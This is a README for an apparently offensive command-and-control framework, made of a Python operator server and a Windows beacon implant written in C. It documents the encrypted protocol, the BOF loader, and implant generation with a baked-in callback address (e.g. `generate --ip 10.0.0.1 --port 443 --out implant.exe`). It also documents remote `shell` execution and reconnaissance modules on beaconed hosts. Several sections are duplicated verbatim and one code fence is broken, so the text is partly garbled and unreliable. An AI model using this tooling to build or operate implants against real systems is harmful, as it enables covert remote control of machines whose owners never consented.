# Command & Control Framework

A lightweight, C2 framework that consists of a Python-based server with an interactive CLI and a Windows beacon agent written in C, communicating over an encrypted custom binary protocol with support for in-process Beacon Object File (BOF) execution.

---

## Features

### Encrypted Custom Binary Protocol

All agent traffic uses a custom binary wire format. The 24-byte plaintext header enables server-side routing without decryption; everything after the header is AES-256-GCM encrypted.

```
Offset  Size  Field
──────  ────  ──────────────────────────────────────────────
  0      4    length      (bytes after this field, big-endian)
  4      4    magic       (0xDEADBEEF — wire format guard)
  8      2    version     (protocol version)
 10      2    flags       (ENCRYPTED | BATCH | ERROR | FRAGMENT)
 12      4    agent_id    (djb2 hash of agent UUID for routing)
 16      4    command     (PKG_CMD_* identifier)
 20      4    request_id  (ties task → result for correlation)
 24    ...    payload     (AES-256-GCM encrypted when flagged)
```

Command IDs are organized by range: `0x0001–0x00FF` lifecycle, `0x0100–0x01FF` tasking, `0x0400–0x04FF` BOF/loaders. The batch flag allows multiple sub-packages to be coalesced into a single checkin request.

### ECDH-P256 Key Exchange

On first contact the beacon generates an ephemeral ECDH-P256 keypair, sends the uncompressed public key (65 bytes, X9.62 format) to `/register`, and receives the server's public key in return. Both sides independently derive the session key:

```
session_key = SHA-256(ECDH shared secret X-coordinate)
```

BCrypt's `BCRYPT_KDF_RAW_SECRET` returns the X-coordinate in little-endian; the agent reverses it to big-endian before hashing so both sides produce identical keys. Each registration produces a fresh ephemeral key — no session key is ever reused.

### Semi-Custom COFFLoader

The COFFLoader (`agent/src/loader/COFFLoader.c`) is a hardened, extended COFF object loader that resolves symbols, applies x86-64 relocations, and executes BOF `go()` entry points in-process. Key design decisions beyond a basic loader:

- **Private heap isolation** — BOF allocations use a dedicated `HeapCreate(HEAP_NO_SERIALIZE)` heap separate from the beacon's own allocator. Corruption in a BOF does not corrupt the beacon heap, and cleanup is a single `HeapDestroy` call.
- **Critical section protection** — a per-loader `CRITICAL_SECTION` with a 4000-spin-count makes the loader safe to call from multiple threads without external synchronization.
- **SEH handler registration** — `__C_specific_handler` (x64) is resolved directly from the linker (not via `GetProcAddress`, which cannot find compiler-internal symbols) and registered so BOFs with structured exception handling work correctly.
- **Guard page detection** — page boundary alignment and read guards catch overruns in relocation processing before they silently corrupt memory.
- **Execution timeout** — configurable `COFF_DEFAULT_TIMEOUT_MS` kills runaway BOFs without hanging the beacon loop.
- **Idempotent init** — `CoffLoaderInit()` uses `InterlockedCompareExchange` for lock-free, thread-safe one-time initialization; safe to call repeatedly.

### Structured Tasking Pipeline

Tasks flow through a typed queue rather than raw command strings:

1. Operator issues `shell <cmd>` or `bof <name> [args]` at the server CLI
2. Server packages the task (including the BOF `.obj` binary for BOF tasks) into a pending queue
3. On the next beacon checkin, pending tasks are batched into a single encrypted response package
4. Beacon dispatches by command ID; BOF tasks are passed directly to the COFFLoader with pre-packed argument buffers
5. Output is captured into a thread-safe buffer and returned in the following checkin as a `PKG_CMD_TASK_OUTPUT` package, correlated back to the original task via `request_id`

### Persistent Agent State

Agent sessions (session key, task history, output, statistics) are serialized to `agents.json` on the server and reloaded on restart. An operator can kill and restart the server without losing active sessions, provided the beacon reconnects within its registration retry window.

### Jittered Sleep

The beacon's checkin interval uses configurable base sleep plus symmetric jitter: `sleep_ms = BASE_MS + rand() % (JITTER_MS * 2) - JITTER_MS`, clamped to a 1-second floor. Compile-time defaults are 5000ms base, 3000ms jitter.

---

## Requirements

### Server
- Python 3.8+
- `pip install flask cryptography`

### Agent (build)
- Windows host or Linux with MinGW-w64 cross-compiler
- `x86_64-w64-mingw32-gcc` on PATH

---

## Building

Beacons are built from the server's interactive CLI using the `generate` command. The server invokes `agent/build.bat` with the supplied parameters and writes the output binary to `agent/build/`.

**Prerequisites** (on the machine running the server):
- `x86_64-w64-mingw32-gcc` on PATH (MinGW-w64)

### generate command

```
 > generate [--ip IP] [--port PORT] [--ua USER_AGENT] [--token AUTH_TOKEN]
            [--sleep MS] [--jitter MS] [--https] [--out filename.exe]
Beacons are built from the server's interactive CLI using the `generate` command. The server invokes `agent/build.bat` with the supplied parameters and writes the output binary to `agent/build/`.

**Prerequisites** (on the machine running the server):
- `x86_64-w64-mingw32-gcc` on PATH (MinGW-w64)

### generate command

```
 > generate [--ip IP] [--port PORT] [--ua USER_AGENT] [--token AUTH_TOKEN]
            [--sleep MS] [--jitter MS] [--https] [--out filename.exe]
```

All flags are optional. Defaults are pulled from the server's own listen address, port, and auth token.

| Flag | Default | Description |
|------|---------|-------------|
| `--ip` | server listen IP (or `127.0.0.1`) | C2 callback address baked into the beacon |
| `--port` | server listen port | C2 callback port |
| `--ua` | `Mozilla/5.0 (Windows NT 10.0; Win64; x64)...` | HTTP User-Agent header |
| `--token` | server auth token | `X-C2-Token` header sent on registration |
| `--sleep` | `5000` | Base checkin interval in milliseconds |
| `--jitter` | `3000` | Symmetric jitter in milliseconds |
| `--https` | off | Enable HTTPS (certificate validation is disabled) |
| `--out` | `beacon.exe` | Output filename under `agent/build/` |

### Examples

```
 > generate
 > generate --ip 10.0.0.1 --port 443 --out implant.exe
 > generate --ip 10.0.0.1 --port 443 --https --token MyToken123 --sleep 10000 --jitter 5000 --out beacon_https.exe
```

The server prints the final binary path on success:

```
 12:00:00  BUILD  Building  beacon.exe  ip=10.0.0.1  port=443  https=False
 12:00:01  OK     Built  /path/to/agent/build/beacon.exe
All flags are optional. Defaults are pulled from the server's own listen address, port, and auth token.

| Flag | Default | Description |
|------|---------|-------------|
| `--ip` | server listen IP (or `127.0.0.1`) | C2 callback address baked into the beacon |
| `--port` | server listen port | C2 callback port |
| `--ua` | `Mozilla/5.0 (Windows NT 10.0; Win64; x64)...` | HTTP User-Agent header |
| `--token` | server auth token | `X-C2-Token` header sent on registration |
| `--sleep` | `5000` | Base checkin interval in milliseconds |
| `--jitter` | `3000` | Symmetric jitter in milliseconds |
| `--https` | off | Enable HTTPS (certificate validation is disabled) |
| `--out` | `beacon.exe` | Output filename under `agent/build/` |

### Examples

```
 > generate
 > generate --ip 10.0.0.1 --port 443 --out implant.exe
 > generate --ip 10.0.0.1 --port 443 --https --token MyToken123 --sleep 10000 --jitter 5000 --out beacon_https.exe
```

The server prints the final binary path on success:

```
 12:00:00  BUILD  Building  beacon.exe  ip=10.0.0.1  port=443  https=False
 12:00:01  OK     Built  /path/to/agent/build/beacon.exe
```

Build output:
- `agent/build/<filename>` — the beacon binary
- `agent/build/bofs/*.obj` — compiled BOF modules (also copied to `server/bofs/`)
- `agent/build/<filename>` — the beacon binary
- `agent/build/bofs/*.obj` — compiled BOF modules (also copied to `server/bofs/`)

---


## Running

### Server

```bash
cd server
python c2server.py
```


The server starts on `0.0.0.0:8080`, restores any previously saved agent state, and opens an interactive CLI:

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  C2 SERVER
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

 12:00:00  OK    listening    0.0.0.0:8080
 12:00:00  OK    bof dir      /path/to/server/bofs
 12:00:00  OK    upload dir   /path/to/server/uploads

 >
```

---

## CLI Reference

### Global Commands

| Command       | Description                           |
|---------------|---------------------------------------|
| `list`        | List all registered agents            |
| `bofs`        | List available BOF modules            |
| `use <id>`    | Select an agent (partial UUID OK)     |
| `clear`       | Clear the terminal                    |
| `help`        | Show command reference                |
| `exit`        | Shut down the server                  |

### Agent Commands (after `use <id>`)

| Command              | Description                                    |
|----------------------|------------------------------------------------|
| `shell <cmd>`        | Execute a shell command via `cmd.exe /c`       |
| `bof <name> [args]`  | Execute a BOF module with optional typed args  |
| `output [n]`         | Show last N command outputs (default 10)       |
| `info`               | Show agent details and session key             |
| `stats`              | Show bytes sent/received, task counts          |
| `kill`               | Send `PKG_CMD_EXIT` — beacon calls ExitProcess |
| `back`               | Deselect the current agent                     |

### BOF Argument Syntax

Arguments to `bof` are space-separated with an optional type prefix. Unprefixed tokens are treated as UTF-8 strings.

| Prefix   | Type           | Example                  |
|----------|----------------|--------------------------|
| `s:`     | UTF-8 string   | `s:C:\Windows\System32`  |
| `w:`     | UTF-16LE string| `w:Administrator`        |
| `i:`     | 32-bit integer | `i:1337`                 |
| `h:`     | 16-bit short   | `h:443`                  |
| *(none)* | UTF-8 string   | `hostname`               |

Arguments are packed by the server using the BeaconPack format before being embedded in the task package. The beacon passes the packed buffer directly to the BOF's `go(char *args, int len)` entry point.

---

## Included BOF Modules

| Module            | Description                                                            |
|-------------------|------------------------------------------------------------------------|
| `whoami`          | Current user, domain, SID, privilege level, token elevation type       |
| `pslist`          | Running process list — PID, PPID, thread count, image name             |
| `sysinfo`         | OS version, hostname, domain, uptime, architecture                     |
| `arp_cache`       | ARP table entries via `GetIpNetTable`                                  |
| `tcp_connections` | Active TCP connections and states via `GetTcpTable2`                   |
| `dirlist`         | Directory listing with file sizes and attributes                       |

### Writing Your Own BOFs

BOFs are standard COFF objects compiled with `gcc -c`. They must export a `go(char *args, int len)` function and use the `BeaconData*` API to parse arguments and `BeaconPrintf` / `BeaconOutput` to produce output. Place the compiled `.obj` in `server/bofs/` and it is immediately available via the `bof` command.

```c
#include "base.h"

void go(char *args, int len) {
    if (!bofstart()) return;

    datap parser;
    BeaconDataParse(&parser, args, len);
    char *target = BeaconDataExtract(&parser, NULL);

    BeaconPrintf(CALLBACK_OUTPUT, "Target: %s\n", target);

    bofstop();
}
```



---

## Credits and Prior Art

This project builds on foundational work from several open-source security research projects. The following projects were referenced, adapted, or directly influenced the design:

**[TrustedSec](https://github.com/trustedsec)**
The COFFLoader implementation and BOF ecosystem are heavily inspired by TrustedSec's open-source tooling. The `beacon_compatibility` shim's KERNEL32$, ADVAPI32$, NTDLL$, and related thunk definitions draw directly from their BOF development headers. The included BOF modules follow the TrustedSec BOF authoring conventions. 

**[Havoc C2](https://github.com/HavocFramework/Havoc)**
The wire protocol framing, command ID namespace conventions, and the batch-package architecture were influenced by Havoc's agent-server communication design. The `PKG_FLAG_BATCH` pattern for coalescing multiple task results into a single checkin is modeled after Havoc's packet batching approach.
---
